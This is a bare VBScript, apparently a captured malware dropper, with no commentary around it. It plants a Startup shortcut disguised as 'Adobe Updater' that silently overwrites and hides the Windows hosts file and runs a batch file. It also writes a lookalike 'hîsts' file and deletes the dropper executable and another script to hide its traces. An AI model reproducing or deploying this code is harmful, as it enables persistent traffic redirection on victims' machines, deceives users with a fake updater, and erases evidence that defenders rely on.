dim filesys
On Error Resume Next
Set filesys = CreateObject("Scripting.FileSystemObject")
set WshShell = WScript.CreateObject("WScript.Shell")
set oShellLink = WshShell.CreateShortcut("C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Adobe Updater.lnk")
oShellLink.TargetPath = "C:\Windows\system32\cmd.exe"
oShellLink.Arguments = " /c copy ""C:\Users\Admin\AppData\Local\Temp\hlp1"" ""C:\Windows\system32\drivers\etc\hosts"" /Y && attrib +H ""C:\Windows\system32\drivers\etc\hosts"" && ""C:\Users\Admin\AppData\Local\Temp\eula.bat"""
oShellLink.IconLocation = "C:\Users\Admin\AppData\Local\Temp\1.ico"
oShellLink.WindowStyle = 7
oShellLink.Description = "Shortcut Script"
oShellLink.WorkingDirectory = "C:\Windows\system32"
oShellLink.Save
filesys.CopyFile "C:\Users\Admin\AppData\Local\Temp\hlp2","C:\Windows\system32\drivers\etc\hîsts",OverwriteExisting
Wscript.Sleep 3000
filesys.DeleteFile("C:\Users\Admin\AppData\Local\Temp\644a58fde56dbc17ff3f84ada6d4bc68.exe")
filesys.DeleteFile("C:\Users\Admin\AppData\Local\Temp\checkexp.vbs")
